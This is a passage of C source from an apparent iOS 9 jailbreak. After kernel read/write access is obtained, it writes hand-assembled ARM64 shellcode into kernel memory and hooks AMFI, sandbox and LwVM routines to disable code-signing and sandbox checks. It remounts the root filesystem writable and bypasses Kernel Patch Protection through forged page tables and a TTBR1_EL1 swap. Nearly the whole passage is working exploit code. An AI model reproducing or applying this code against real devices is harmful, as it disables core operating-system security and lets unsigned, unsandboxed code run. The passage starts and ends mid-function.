        DEBUGLog("Sandbox __DATA.__got");
        if(!(sb_PE_i_can_has_debugger_got = KOFFSET(region, find_sb_PE_i_can_has_debugger_got(region, kdata, ksize, mpc_ops.mpo_vnode_check_exec)))) goto fail;
        if(!(sb_memset_got = KOFFSET(region, find_sb_memset_got(region, kdata, ksize, mpc_ops.mpo_proc_check_fork)))) goto fail;
        if(!(sb_vfs_rootvnode_got = KOFFSET(region, find_sb_vfs_rootvnode_got(region, kdata, ksize, mpc_ops.mpo_mount_check_remount)))) goto fail;
    }
    
    {
        DEBUGLog("vnode");
        vfs_rootvnode_fn = ReadAnywhere64(sb_vfs_rootvnode_got);
        if(!vfs_rootvnode_fn) {
            DEBUGLog("[ERROR] Failed to read offset!");
            goto fail;
        }
        
        if(!(rootvnode = KOFFSET(region, find_rootvnode_offset(region, kdata, ksize, vfs_rootvnode_fn)))) goto fail;
        rootfs_vnode = ReadAnywhere64(rootvnode);
        if(!rootvnode) {
            DEBUGLog("[ERROR] Failed to read offset!");
            goto fail;
        }
    }
    
    
    DEBUGLog("patching kernel");
    /*--- shellcode ---*/
    uint64_t shellcode = 0;
    uint64_t ptr = 0;
    mach_vm_allocate(tfp0, (mach_vm_address_t*)&shellcode, 0x1000, VM_FLAGS_ANYWHERE); // r-x
    mach_vm_allocate(tfp0, (mach_vm_address_t*)&ptr, 0x1000, VM_FLAGS_ANYWHERE); // rw-
    DEBUGLog("[*] shellcode: %llx", shellcode);
    DEBUGLog("[*] ptr: %llx", ptr);
    
    {
        printLog("[AMFI] shellcode");
        // amfi
        amfiBase = shellcode + 0x200;
        WriteAnywhere32(shellcode + 0x200, 0x580003c8); // ldr        x8, _amfi_execve_hook
        WriteAnywhere32(shellcode + 0x204, 0xeb0803df); // cmp        x30, x8
        WriteAnywhere32(shellcode + 0x208, 0x54000060); // b.eq       _shellcode+0x214
        WriteAnywhere32(shellcode + 0x20c, 0x580003a8); // ldr        x8, _vnode_isreg
        WriteAnywhere32(shellcode + 0x210, 0xd61f0100); // br         x8
        
        WriteAnywhere32(shellcode + 0x214, 0xf9400fb0); // ldr        x16, [x29, #0x18]
        WriteAnywhere32(shellcode + 0x218, 0xb9400208); // ldr        w8, [x16]
        WriteAnywhere32(shellcode + 0x21c, 0x32060108); // orr        w8, w8, #0x4000000
        WriteAnywhere32(shellcode + 0x220, 0x321e0108); // orr        w8, w8, #0x4
        WriteAnywhere32(shellcode + 0x224, 0x321d0108); // orr        w8, w8, #0x8
        WriteAnywhere32(shellcode + 0x228, 0x12146d08); // and        w8, w8, #0xfffffffffffff0ff
        WriteAnywhere32(shellcode + 0x22c, 0xb9000208); // str        w8, [x16]
        WriteAnywhere32(shellcode + 0x230, 0xf94007a8); // ldr        x8, [x29, #0x8]
        WriteAnywhere32(shellcode + 0x234, 0x580002b0); // ldr        x16, ptr
        WriteAnywhere32(shellcode + 0x238, 0xf9000208); // str        x8, [x16]
        WriteAnywhere32(shellcode + 0x23c, 0x10000088); // adr        x8, #0x24c
        WriteAnywhere32(shellcode + 0x240, 0xf90007a8); // str        x8, [x29, #0x8]
        WriteAnywhere32(shellcode + 0x244, 0x580001e8); // ldr        x8, _vnode_isreg
        WriteAnywhere32(shellcode + 0x248, 0xd61f0100); // br         x8
        
        WriteAnywhere32(shellcode + 0x24c, 0xf94007f0); // ldr        x16, [sp, #0x8]
        WriteAnywhere32(shellcode + 0x250, 0xb9400208); // ldr        w8, [x16]
        WriteAnywhere32(shellcode + 0x254, 0x32060108); // orr        w8, w8, #0x4000000
        WriteAnywhere32(shellcode + 0x258, 0x321e0108); // orr        w8, w8, #0x4
        WriteAnywhere32(shellcode + 0x25c, 0x321d0108); // orr        w8, w8, #0x8
        WriteAnywhere32(shellcode + 0x260, 0x12146d08); // and        w8, w8, #0xfffffffffffff0ff
        WriteAnywhere32(shellcode + 0x264, 0xb9000208); // str        w8, [x16]
        WriteAnywhere32(shellcode + 0x268, 0x58000110); // ldr        x16, ptr
        WriteAnywhere32(shellcode + 0x26c, 0xf9400210); // ldr        x16, [x16]
        WriteAnywhere32(shellcode + 0x270, 0xd2800000); // movz       x0, #0x0
        WriteAnywhere32(shellcode + 0x274, 0xd61f0200); // br         x16
        
        WriteAnywhere64(shellcode + 0x278, _amfi_execve_hook);
        WriteAnywhere64(shellcode + 0x280, _vnode_isreg);
        WriteAnywhere64(shellcode + 0x288, ptr);
    }
    
    {
        printLog("[Sandbox] shellcode");
        // sandbox
        uint64_t shc = 0;
        uint64_t next = 0;
        
        shc = shellcode + 0x2a0;
        sbWriteCode(shc, proc_check_fork_lr, proc_check_fork_ret, memset_stub); next = shc; shc += 0x40;
        sbWriteCode(shc, iokit_check_open_lr, iokit_check_open_ret, next); next = shc; shc += 0x40;
        sbWriteCode(shc, mount_check_fsctl_lr, mount_check_fsctl_ret, next); next = shc; shc += 0x40;
        sbWriteCode(shc, vnode_check_rename_lr_1, vnode_check_rename_ret, next); next = shc; shc += 0x40;
        sbWriteCode(shc, vnode_check_rename_lr_2, vnode_check_rename_ret, next); next = shc; shc += 0x40;
        sbWriteCode(shc, vnode_check_rename_lr_3, vnode_check_rename_ret, next); next = shc; shc += 0x40;
        sbWriteCode(shc, vnode_check_rename_lr_4, vnode_check_rename_ret, next); next = shc; shc += 0x40;
        sbWriteCode(shc, vnode_check_access_lr, vnode_check_access_ret, next); next = shc; shc += 0x40;
        sbWriteCode(shc, vnode_check_chroot_lr, vnode_check_chroot_ret, next); next = shc; shc += 0x40;
        sbWriteCode(shc, vnode_check_create_lr_1, vnode_check_create_ret, next); next = shc; shc += 0x40;
        sbWriteCode(shc, vnode_check_create_lr_2, vnode_check_create_ret, next); next = shc; shc += 0x40;
        sbWriteCode(shc, vnode_check_create_lr_3, vnode_check_create_ret, next); next = shc; shc += 0x40;
        sbWriteCode(shc, vnode_check_deleteextattr_lr, vnode_check_deleteextattr_ret, next); next = shc; shc += 0x40;
        sbWriteCode(shc, vnode_check_exchangedata_lr_1, vnode_check_exchangedata_ret, next); next = shc; shc += 0x40;
        sbWriteCode(shc, vnode_check_exchangedata_lr_2, vnode_check_exchangedata_ret, next); next = shc; shc += 0x40;
        sbWriteCode(shc, vnode_check_getattrlist_lr, vnode_check_getattrlist_ret, next); next = shc; shc += 0x40;
        sbWriteCode(shc, vnode_check_getextattr_lr, vnode_check_getextattr_ret, next); next = shc; shc += 0x40;
        sbWriteCode(shc, vnode_check_ioctl_lr, vnode_check_ioctl_ret, next); next = shc; shc += 0x40;
        sbWriteCode(shc, vnode_check_link_lr_1, vnode_check_link_ret, next); next = shc; shc += 0x40;
        sbWriteCode(shc, vnode_check_link_lr_2, vnode_check_link_ret, next); next = shc; shc += 0x40;
        sbWriteCode(shc, vnode_check_link_lr_3, vnode_check_link_ret, next); next = shc; shc += 0x40;
        sbWriteCode(shc, vnode_check_listextattr_lr, vnode_check_listextattr_ret, next); next = shc; shc += 0x40;
        sbWriteCode(shc, vnode_check_open_lr, vnode_check_open_ret, next); next = shc; shc += 0x40;
        sbWriteCode(shc, vnode_check_readlink_lr, vnode_check_readlink_ret, next); next = shc; shc += 0x40;
        sbWriteCode(shc, vnode_check_revoke_lr, vnode_check_revoke_ret, next); next = shc; shc += 0x40;
        sbWriteCode(shc, vnode_check_setattrlist_lr, vnode_check_setattrlist_ret, next); next = shc; shc += 0x40;
        sbWriteCode(shc, vnode_check_setextattr_lr, vnode_check_setextattr_ret, next); next = shc; shc += 0x40;
        sbWriteCode(shc, vnode_check_setflags_lr, vnode_check_setflags_ret, next); next = shc; shc += 0x40;
        sbWriteCode(shc, vnode_check_setmode_lr, vnode_check_setmode_ret, next); next = shc; shc += 0x40;
        sbWriteCode(shc, vnode_check_setowner_lr, vnode_check_setowner_ret, next); next = shc; shc += 0x40;
        sbWriteCode(shc, vnode_check_setutimes_lr, vnode_check_setutimes_ret, next); next = shc; shc += 0x40;
        sbWriteCode(shc, vnode_check_stat_lr, vnode_check_stat_ret, next); next = shc; shc += 0x40;
        sbWriteCode(shc, vnode_check_truncate_lr, vnode_check_truncate_ret, next); next = shc; shc += 0x40;
        sbWriteCode(shc, vnode_check_unlink_lr_1, vnode_check_unlink_ret, next); next = shc; shc += 0x40;
        sbWriteCode(shc, vnode_check_unlink_lr_2, vnode_check_unlink_ret, next); next = shc; shc += 0x40;
        sbWriteCode(shc, file_check_mmap_lr, file_check_mmap_ret, next);
        
        mach_vm_protect(tfp0, shellcode, 0x1000, 0x0, VM_PROT_READ|VM_PROT_EXECUTE);
        mach_vm_protect(tfp0, ptr, 0x1000, 0x0, VM_PROT_READ|VM_PROT_WRITE);
        
        sbBase = shc;
    }
    printLog("[*] shellcode: DONE");
    sleep(1);
    
    // __DATA.__got
    printLog("[*] Hooking __DATA.__got");
    {
        // LwVM
        printLog("[LwVM] _PE_i_can_has_kernel_configuration -> isWriteProtected check bypass");
        WriteAnywhere64(lwvm_krnl_conf_got, lwvm_jump);
        
        // AMFI
        printLog("[AMFI] _PE_i_can_has_debugger -> ret1 gadget");
        WriteAnywhere64(amfi_PE_i_can_has_debugger_got, ret1_gadget);
        printLog("[AMFI] _cs_enforcement -> ret0 gadget");
        WriteAnywhere64(amfi_cs_enforcement_got, ret0_gadget);
        printLog("[AMFI] _vnode_isreg -> shellcode");
        WriteAnywhere64(amfi_vnode_isreg_got, amfiBase);
        
        // Sandbox
        printLog("[Sandbox] _PE_i_can_has_debugger -> ret1 gadget");
        WriteAnywhere64(sb_PE_i_can_has_debugger_got, ret1_gadget);
        printLog("[Sandbox] _memset -> shellcode");
        WriteAnywhere64(sb_memset_got, sbBase);
    }
    printLog("[*] DONE");
    
    sleep(1);
    
    {
        // remount (kppless...)
        vm_offset_t off = 0xd8;
        uint64_t v_mount = ReadAnywhere64(rootfs_vnode+off);
        uint32_t v_flag = ReadAnywhere32(v_mount + 0x79);
        
        WriteAnywhere32(v_mount + 0x79, v_flag & ~(1 << 6));
        
        char *nmz = strdup("/dev/disk0s1s1");
        int rv = mount("hfs", "/", MNT_UPDATE, (void *)&nmz); // remount?
        printLog("remounting: %d", rv);
        
        v_mount = ReadAnywhere64(rootfs_vnode + off);
        WriteAnywhere32(v_mount + 0x79, v_flag);
    }
    
    printLog("[*] patched!");
    
    return 0;
    
fail:
    printLog("[ERROR] Failed to search koffset!");
    return -1;
}







/* qwertyoruiop's KPP bypass?! */
static uint64_t slide;
static uint64_t gPhysBase;
static uint64_t gVirtBase;
static uint64_t level1_table;
static uint64_t ttbr1_el1;

static const uint64_t addr_start = 0xffffff8000000000;
static char pagebuf[0x1000];

#define RETVAL_PHYS  (0)
#define RETVAL_VIRT  (1)
#define TTE_GET(tte, mask) (tte & mask)
#define TTE_SET(tte, mask, val) tte = ((tte & (~mask)) | (val & mask))
#define TTE_SETB(tte, mask) tte = tte | mask
#define TTE_IS_VALID_MASK 0x1
#define TTE_IS_TABLE_MASK 0x2
#define TTE_PHYS_VALUE_MASK 0xFFFFFFFFF000ULL
#define TTE_BLOCK_ATTR_PXN_MASK (1ULL << 53)
#define TTE_BLOCK_ATTR_UXN_MASK (1ULL << 54)

/*-- Remapping utils for KPP bypass --*/
static uint64_t physalloc(uint64_t size)
{
    uint64_t ret = 0;
    mach_vm_allocate(tfp0, (mach_vm_address_t*) &ret, size, VM_FLAGS_ANYWHERE);
    return ret;
}

static uint64_t pagetable_lookup(uint64_t vaddr, uint64_t ttbr, bool retval)
{
    uint64_t level1_entry = 0;
    
    // get level1 entry
    uint64_t L1_table = ttbr - gPhysBase + gVirtBase;
    level1_entry = ReadAnywhere64(L1_table);
    DEBUGLog("level1_entry: %llx", level1_entry);
    
    // read level2 (each corresponds to 2Mb)
    uint64_t level2_base = (level1_entry & 0xfffffff000) - gPhysBase + gVirtBase;
    uint64_t level2_table = level2_base + (((vaddr - addr_start) >> 21) << 3);
    DEBUGLog("level2_base: %llx", level2_base);
    DEBUGLog("level2_table: %llx", level2_table);
    uint64_t level2_entry = ReadAnywhere64(level2_table);
    
    // level3, each corresponding to a 4K page
    uint64_t level3_base = (level2_entry & 0xfffffff000) - gPhysBase + gVirtBase;
    uint64_t level3_table = level3_base + (((vaddr & 0x1fffff) >> 12) << 3);
    DEBUGLog("level2_entry: %llx", level2_entry);
    DEBUGLog("level3_base: %llx", level3_base);
    DEBUGLog("level3_table: %llx", level3_table);
    uint64_t level3_entry = ReadAnywhere64(level3_table);
    DEBUGLog("level3_entry: %llx", level3_entry);
    
    uint64_t phys = (level3_entry & 0xfffffff000);
    if(retval == RETVAL_PHYS) return phys;
    
    uint64_t virt = phys - gPhysBase + gVirtBase;
    
    return virt;
}

static uint64_t fakepage_lookup(uint64_t addr, uint64_t ttbr1_el1_fake)
{
    int bk=0;
    
    uint64_t vaddr = addr & ~0xfff;
    uint64_t vmask = addr & 0xfff;
    
    DEBUGLog("Page: %llx", vaddr);
    
    /*-- original pagetable --*/
    DEBUGLog("Original Page Table");
    uint64_t level1_table_orig = ttbr1_el1 - gPhysBase + gVirtBase;
    uint64_t L1_PA_orig = (ReadAnywhere64(level1_table_orig) & 0xfffffff000);
    uint64_t L2_PA_orig = (ReadAnywhere64(L1_PA_orig - gPhysBase + gVirtBase + (((vaddr - addr_start) >> 21) << 3)) & 0xfffffff000);
    uint64_t L3_PA_orig = (ReadAnywhere64(L2_PA_orig - gPhysBase + gVirtBase + (((vaddr & 0x1fffff) >> 12) << 3)) & 0xfffffff000);
    
    DEBUGLog("level1_table: %llx", level1_table_orig);
    DEBUGLog("level1 phys: %llx", L1_PA_orig);
    DEBUGLog("level2 phys: %llx", L2_PA_orig);
    DEBUGLog("level3 phys: %llx", L3_PA_orig);
    /*---- end ----*/
    
    /*-- setting for fakepage --*/
    uint64_t level1_table_fake = ttbr1_el1_fake - gPhysBase + gVirtBase;
    uint64_t level1_entry = ReadAnywhere64(level1_table_fake); // fake l1 entry
    uint64_t L1_PA = (level1_entry & 0xfffffff000); // fake L1 phys
    
    uint64_t level2_base = L1_PA - gPhysBase + gVirtBase;
    
    if(L1_PA == L1_PA_orig){
        /*-- Remap for fakeL1 --*/
        bzero(pagebuf, 0x1000);
        uint64_t level1_pte = physalloc(0x1000); // Create New L2 table
        copyin(pagebuf, level2_base, 0x1000);
        copyout(level1_pte, pagebuf, 0x1000);
        uint64_t level1_pte_phys = pagetable_lookup(level1_pte, ttbr1_el1_fake, RETVAL_PHYS);
        TTE_SET(level1_entry, TTE_PHYS_VALUE_MASK, level1_pte_phys);
        TTE_SET(level1_entry, TTE_BLOCK_ATTR_UXN_MASK, 0);
        TTE_SET(level1_entry, TTE_BLOCK_ATTR_PXN_MASK, 0);
        DEBUGLog("level1_entry: %llx", level1_entry);
        WriteAnywhere64(level1_table_fake, level1_entry);
        
        L1_PA = (level1_entry & 0xfffffff000);
        level2_base = L1_PA - gPhysBase + gVirtBase;
    }
    
    uint64_t level2_table = level2_base + (((vaddr - addr_start) >> 21) << 3);
    uint64_t level2_entry = ReadAnywhere64(level2_table);
    
    if((level2_entry & 0x3) != 0x3){
        uint64_t fakep = physalloc(0x1000);
        uint64_t realp = TTE_GET(level2_entry, TTE_PHYS_VALUE_MASK);
        TTE_SETB(level2_entry, TTE_IS_TABLE_MASK);
        for (int i = 0; i < (0x1000/8); i++) {
            TTE_SET(level2_entry, TTE_PHYS_VALUE_MASK, realp + i * 0x1000);
            WriteAnywhere64(fakep+i*8, level2_entry);
        }
        TTE_SET(level2_entry, TTE_PHYS_VALUE_MASK, pagetable_lookup(fakep, ttbr1_el1_fake, RETVAL_PHYS));
        WriteAnywhere64(level2_table, level2_entry);
        bk = 1;
    }
    
    uint64_t L2_PA = (level2_entry & 0xfffffff000);
    
    uint64_t level3_base = L2_PA - gPhysBase + gVirtBase;
    
    if(bk == 1 || L2_PA == L2_PA_orig){
        /*-- Remap for fakeL2 --*/
        bzero(pagebuf, 0x1000);
        uint64_t level2_pte = physalloc(0x1000);
        copyin(pagebuf, level3_base, 0x1000);
        copyout(level2_pte, pagebuf, 0x1000);
        uint64_t level2_pte_phys = pagetable_lookup(level2_pte, ttbr1_el1_fake, RETVAL_PHYS);
        TTE_SET(level2_entry, TTE_PHYS_VALUE_MASK, level2_pte_phys);
        TTE_SET(level2_entry, TTE_BLOCK_ATTR_UXN_MASK, 0);
        TTE_SET(level2_entry, TTE_BLOCK_ATTR_PXN_MASK, 0);
        DEBUGLog("level2_entry: %llx", level2_entry);
        WriteAnywhere64(level2_table, level2_entry);
        
        L2_PA = (level2_entry & 0xfffffff000);
        level3_base = L2_PA - gPhysBase + gVirtBase;
    }
    
    uint64_t level3_table = level3_base + (((vaddr & 0x1fffff) >> 12) << 3);
    
    uint64_t level3_entry = ReadAnywhere64(level3_table);
    
    if((level3_entry & 0x3) != 0x3){
        uint64_t fakep = physalloc(0x1000);
        uint64_t realp = TTE_GET(level3_entry, TTE_PHYS_VALUE_MASK);
        TTE_SETB(level3_entry, TTE_IS_TABLE_MASK);
        for (int i = 0; i < (0x1000/8); i++) {
            TTE_SET(level3_entry, TTE_PHYS_VALUE_MASK, realp + i * 0x1000);
            WriteAnywhere64(fakep+i*8, level3_entry);
        }
        TTE_SET(level3_entry, TTE_PHYS_VALUE_MASK, pagetable_lookup(fakep, ttbr1_el1_fake, RETVAL_PHYS));
        WriteAnywhere64(level3_table, level3_entry);
        bk = 1;
    }
    
    uint64_t L3_PA = (level3_entry & 0xfffffff000);
    
    uint64_t page_base = L3_PA - gPhysBase + gVirtBase;
    
    if(bk == 1 || L3_PA == L3_PA_orig){
        /*-- Remap for fakeL3 --*/
        bzero(pagebuf, 0x1000);
        uint64_t level3_pte = physalloc(0x1000);
        copyin(pagebuf, page_base, 0x1000);
        copyout(level3_pte, pagebuf, 0x1000);
        uint64_t fakePage = pagetable_lookup(level3_pte, ttbr1_el1_fake, RETVAL_PHYS);
        TTE_SET(level3_entry, TTE_PHYS_VALUE_MASK, fakePage);
        TTE_SET(level3_entry, TTE_BLOCK_ATTR_UXN_MASK, 0);
        TTE_SET(level3_entry, TTE_BLOCK_ATTR_PXN_MASK, 0);
        DEBUGLog("level3_entry: %llx", level3_entry);
        WriteAnywhere64(level3_table, level3_entry);
        
        L3_PA = (level3_entry & 0xfffffff000);
        page_base = L3_PA - gPhysBase + gVirtBase;
    }
    
    DEBUGLog("New_VA: %llx", page_base+vmask);
    return page_base+vmask;
}

static void policy_patch(uint64_t ops, uint64_t ttbr){
    uint64_t new_ops = fakepage_lookup(ops, ttbr);
    WriteAnywhere64(new_ops, 0);
}

static int kpp9(uint64_t region, uint64_t lwvm_type)
{
    slide = region - 0xffffff8004004000;
    printLog("kslide: %llx", slide);
    
    init_kernel(region);
    
    /*---- patchfinder64 ----*/
    uint64_t entryp = kernel_entry + slide;
    uint64_t rvbar = entryp & (~0xFFF);
    uint64_t cpul = find_register_value(kdata, rvbar+0x54, 1); // 9.3.3, n51
    DEBUGLog("entryp: %llx", entryp);
    DEBUGLog("rvbar: %llx", rvbar);
    DEBUGLog("cpul: %llx", cpul);
    
    uint64_t gPhysAddr = region + find_gPhysAddr(region, kdata, ksize);
    uint64_t gVirtAddr = region + find_gVirtAddr(region, kdata, ksize);
    
    gPhysBase = ReadAnywhere64(gPhysAddr);
    gVirtBase = ReadAnywhere64(gVirtAddr);
    printLog("gPhysBase: %llx", gPhysBase);
    printLog("gVirtBase: %llx", gVirtBase);
    
    uint64_t pmap_location = region + find_pmap_location(region, kdata, ksize);
    level1_table = ReadAnywhere64(ReadAnywhere64(pmap_location));
    printLog("pmap_location: %llx", pmap_location);
    printLog("level1_table: %llx", level1_table);
    
    uint64_t cpu_list = ReadAnywhere64(cpul - 0x10) - gPhysBase + gVirtBase;
    uint64_t cpu_data_paddr = ReadAnywhere64(cpu_list);
    DEBUGLog("cpu_list: %llx", cpu_list);
    DEBUGLog("cpu_data_paddr: %llx", cpu_data_paddr);
    
    uint64_t cpu_ttep = region + find_ttbr1_el1(region, kdata, ksize);
    ttbr1_el1 = ReadAnywhere64(cpu_ttep);
    printLog("ttbr1_el1: %llx", ttbr1_el1);
    
    /*-- Patchfinder64 - KPP --*/
    uint64_t cpacr_addr = region + find_cpacr_el1(region, kdata, ksize);
    uint64_t shtramp = region + ((const struct mach_header *)kernel_mh)->sizeofcmds + sizeof(struct mach_header_64);
    
    printLog("cpacr_addr: %llx", cpacr_addr);
    printLog("shtramp: %llx", shtramp);
    
    /*-- Patchfinder64 - Jailbreak --*/
    uint64_t mac_mount = region + find_mac_mount_patch(region, kdata, ksize);
    
    // sbops
    uint64_t sbops = region + find_sandbox_mac_policy_ops(region, kdata, ksize);
    
    // LwVM
    uint64_t lwvm_krnl_conf_got;
    
    if(lwvm_type == 1){
        // 9.3.2-9.3.5
        lwvm_krnl_conf_got = region + find_PE_i_can_has_kernel_configuration_got(region, kdata, ksize);
    } else {
        // -9.3.1
        lwvm_krnl_conf_got = region + find_LwVM_PE_i_can_has_debugger_got(region, kdata, ksize);
    }
    
    uint64_t lwvm_jump = region + find_lwvm_jump(region, kdata, ksize);
    uint64_t debug_enabled = region + find_debug_enabled(region, kdata, ksize);
    uint64_t amfi_allow_any_sign = region + find_amfi_allow_any_signature(region, kdata, ksize);
    uint64_t amfi_ret = region + find_amfi_ret(region, kdata, ksize);
    
#ifdef PATCH_TFP0
    uint64_t tfp0_addr = region + find_task_for_pid(region, kdata, ksize);
    printLog("tfp0_addr: %llx", tfp0_addr);
#endif
    printLog("mac_mount: %llx", mac_mount);
    printLog("sbops: %llx", sbops);
    printLog("lwvm_krnl_conf: %llx", lwvm_krnl_conf_got);
    printLog("lwvm_jump: %llx", lwvm_jump);
    printLog("debug_enabled: %llx", debug_enabled);
    printLog("amfi_allow_any_sign: %llx", amfi_allow_any_sign);
    printLog("amfi_ret: %llx", amfi_ret);
    
    /*-- cpu --*/
    uint64_t cpu = cpu_data_paddr;
    uint64_t idlesleep_handler = 0;
    
    uint64_t plist[12]={0,0,0,0,0,0,0,0,0,0,0,0};
    int z = 0;
    int idx = 0;
    int ridx = 0;
    
    while (cpu) {
        cpu = cpu - gPhysBase + gVirtBase;
        if ((ReadAnywhere64(cpu+0x130) & 0x3FFF) == 0x100) {
            printLog("already jailbroken?, bailing out");
            return -1;
        }
        
        if (!idlesleep_handler) {
            idlesleep_handler = ReadAnywhere64(cpu+0x130) - gPhysBase + gVirtBase;
            uint32_t* opcz = malloc(0x1000);
            copyin(opcz, idlesleep_handler, 0x1000);
            idx = 0;
            while (1) {
                if (opcz[idx] == 0xd61f0000 /* br x0 */) {
                    break;
                }
                idx++;
            }
            ridx = idx;
            while (1) {
                if (opcz[ridx] == 0xd65f03c0 /* ret */) {
                    break;
                }
                ridx++;
            }
        }
        
        DEBUGLog("found cpu: %x", ReadAnywhere32(cpu+0x330));
        DEBUGLog("found physz: %llx", ReadAnywhere64(cpu+0x130) - gPhysBase + gVirtBase);
        
        plist[z++] = cpu+0x130;
        cpu_list += 0x10;
        cpu = ReadAnywhere64(cpu_list);
    }
    
    DEBUGLog("idlesleep_handler: %llx", idlesleep_handler);
    
    uint64_t regi = find_register_value(kdata, idlesleep_handler+12, 30);
    uint64_t regd = find_register_value(kdata, idlesleep_handler+24, 30);
    DEBUGLog("%llx, %llx", regi, regd);
    
    uint64_t ml_get_wake_timebase = region + find_ml_get_wake_timebase(region, kdata, ksize);
    DEBUGLog("ml_get_wake_timebase: %llx", ml_get_wake_timebase);
    
    uint64_t preg = find_register_value(kdata, ml_get_wake_timebase+8, 8);
    uint64_t reg = search_handler(preg, ReadAnywhere32(ml_get_wake_timebase+8));
    DEBUGLog("reg: %llx, %llx, %llx", preg, reg, idlesleep_handler - gVirtBase + gPhysBase);
    
    /*-- fake ttbr --*/
    uint64_t level0_pte = physalloc(0x1000);
    char* bbuf = malloc(0x1000);
    copyin(bbuf, ttbr1_el1 - gPhysBase + gVirtBase, 0x1000);
    copyout(level0_pte, bbuf, 0x1000);
    uint64_t physp = pagetable_lookup(level0_pte, ttbr1_el1, RETVAL_PHYS);
    DEBUGLog("fake ttbr1_el1: %llx", physp);
    
    
    /*-- shellcode --*/
    uint64_t shellcode = physalloc(0x1000);
    
    WriteAnywhere32(shellcode + 0x100 + 0, 0x5800009e); /* trampoline for idlesleep */
    WriteAnywhere32(shellcode + 0x100 + 4, 0x580000a0);
    WriteAnywhere32(shellcode + 0x100 + 8, 0xd61f0000);
    
    WriteAnywhere32(shellcode + 0x200 + 0, 0x5800009e); /* trampoline for deepsleep */
    WriteAnywhere32(shellcode + 0x200 + 4, 0x580000a0);
    WriteAnywhere32(shellcode + 0x200 + 8, 0xd61f0000);
    
    uint64_t physcode = pagetable_lookup(shellcode, ttbr1_el1, RETVAL_PHYS);
    DEBUGLog("physcode: %llx", physcode);
    
    /*-- shc --*/
    uint64_t shc = physalloc(0x1000);
    DEBUGLog("shc: %llx", shc);
    for (int i = 0; i < 0x500/4; i++) {
        WriteAnywhere32(shc+i*4, 0xd503201f); // nop
    }
    
    {
        WriteAnywhere32(shc,    0x5800019e); // ldr x30, #40
        WriteAnywhere32(shc+4,  0xd518203e); // msr ttbr1_el1, x30
        WriteAnywhere32(shc+8,  0xd508871f); // tlbi vmalle1
        WriteAnywhere32(shc+12, 0xd5033fdf); // isb
        WriteAnywhere32(shc+16, 0xd5033f9f); // dsb sy
        WriteAnywhere32(shc+20, 0xd5033b9f); // dsb ish
        WriteAnywhere32(shc+24, 0xd5033fdf); // isb
        WriteAnywhere32(shc+28, 0x5800007e); // ldr x30, 8
        WriteAnywhere32(shc+32, 0xd65f03c0); // ret
        WriteAnywhere64(shc+40, regi);  // idlesleep
        WriteAnywhere64(shc+48, physp); // ttbr1_el1_fake
        
        WriteAnywhere32(shc+0x100,    0x5800019e); // ldr x30, #40
        WriteAnywhere32(shc+0x100+4,  0xd518203e); // msr ttbr1_el1, x30
        WriteAnywhere32(shc+0x100+8,  0xd508871f); // tlbi vmalle1
        WriteAnywhere32(shc+0x100+12, 0xd5033fdf); // isb
        WriteAnywhere32(shc+0x100+16, 0xd5033f9f); // dsb sy
        WriteAnywhere32(shc+0x100+20, 0xd5033b9f); // dsb ish
        WriteAnywhere32(shc+0x100+24, 0xd5033fdf); // isb
        WriteAnywhere32(shc+0x100+28, 0x5800007e); // ldr x30, 8
        WriteAnywhere32(shc+0x100+32, 0xd65f03c0); // ret
        WriteAnywhere64(shc+0x100+40, regd);  // deepsleep
        WriteAnywhere64(shc+0x100+48, physp); // ttbr1_el1_fake
    }
    
    {
        WriteAnywhere32(shc+0x400+0x00, 0xb9400301); // ldr w1, [x24]
        WriteAnywhere32(shc+0x400+0x04, 0x32060021); // orr w1, w1,   #0x04000000
        WriteAnywhere32(shc+0x400+0x08, 0x32000c21); // orr w1, w1,   #0x000f
        WriteAnywhere32(shc+0x400+0x0c, 0x12126421); // and w1, w1, #(~0x3f00)
        WriteAnywhere32(shc+0x400+0x10, 0xb9000301); // str w1, [x24]
        WriteAnywhere32(shc+0x400+0x14, 0xaa1f03e0); // mov x0, xzr
        WriteAnywhere32(shc+0x400+0x18, 0xd10143bf); // sub sp, x29, #0x50
        WriteAnywhere32(shc+0x400+0x1c, 0xa9457bfd); // ldp x29, x30, [sp, #0x50]
        WriteAnywhere32(shc+0x400+0x20, 0xa9444ff4); // ldp x20, x19, [sp, #0x40]
        WriteAnywhere32(shc+0x400+0x24, 0xa94357f6); // ldp x22, x21, [sp, #0x30]
        WriteAnywhere32(shc+0x400+0x28, 0xa9425ff8); // ldp x24, x23, [sp, #0x20]
        WriteAnywhere32(shc+0x400+0x2c, 0xa94167fa); // ldp x26, x25, [sp, #0x10]
        WriteAnywhere32(shc+0x400+0x30, 0xa8c66ffc); // ldp x28, x27, [sp], #0x60
        WriteAnywhere32(shc+0x400+0x34, 0xd65f03c0); // ret
    }
    
    mach_vm_protect(tfp0, shc, 0x1000, 0, VM_PROT_READ|VM_PROT_EXECUTE);
    
    /*-- shellcode --*/
    WriteAnywhere64(shellcode + 0x100 + 0x10, shc - gVirtBase + gPhysBase); // idle
    WriteAnywhere64(shellcode + 0x200 + 0x10, shc + 0x100 - gVirtBase + gPhysBase); // idle
    
    WriteAnywhere64(shellcode + 0x100 + 0x18, idlesleep_handler - gVirtBase + gPhysBase + 8); // idlehandler
    WriteAnywhere64(shellcode + 0x200 + 0x18, idlesleep_handler - gVirtBase + gPhysBase + 8); // deephandler
    
    //mach_vm_protect(tfp0, shellcode, 0x1000, 0, VM_PROT_READ|VM_PROT_EXECUTE);
    
    /*-- kppsh --*/
    uint64_t kppsh = physalloc(0x1000);
    DEBUGLog("kppsh: %llx", kppsh);
    
    {
        WriteAnywhere32(kppsh+0x00, 0x580001e1); // ldr    x1, #60
        WriteAnywhere32(kppsh+0x04, 0x58000140); // ldr    x0, #40
        WriteAnywhere32(kppsh+0x08, 0xd5182020); // msr    TTBR1_EL1, x0
        WriteAnywhere32(kppsh+0x0c, 0xd2a00600); // movz   x0, #0x30, lsl #16
        WriteAnywhere32(kppsh+0x10, 0xd5181040); // msr    CPACR_EL1, x0
        WriteAnywhere32(kppsh+0x14, 0xd5182021); // msr    TTBR1_EL1, x1
        WriteAnywhere32(kppsh+0x18, 0x10ffffe0); // adr    x0, #-4
        WriteAnywhere32(kppsh+0x1c, 0xd5033b9f); // dsb    ish (4k)
        WriteAnywhere32(kppsh+0x20, 0xd508871f); // tlbi   vmalle1 (4k)
        WriteAnywhere32(kppsh+0x24, 0xd5033fdf); // isb
        WriteAnywhere32(kppsh+0x28, 0xd65f03c0); // ret
        WriteAnywhere64(kppsh+0x2c, ttbr1_el1);
        WriteAnywhere64(kppsh+0x34, physp);
        WriteAnywhere64(kppsh+0x3c, physp);
    }
    
